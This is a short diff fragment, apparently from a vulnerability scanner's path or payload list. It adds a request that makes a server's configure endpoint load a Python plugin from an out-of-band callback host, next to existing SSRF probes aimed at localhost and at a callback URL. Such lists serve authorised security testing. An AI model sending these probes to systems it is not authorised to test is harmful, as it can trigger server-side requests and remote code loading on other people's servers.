@@ -46,3 +46,4 @@
 /openam/ui/PWResetUserValidation
 /cors?url=http://127.0.0.1:8080/version
 /cors?url=http://{{interactsh-url}}/version
+/rest/configure?plugins=http://{{interactsh-url}}/{{randstr}}.py
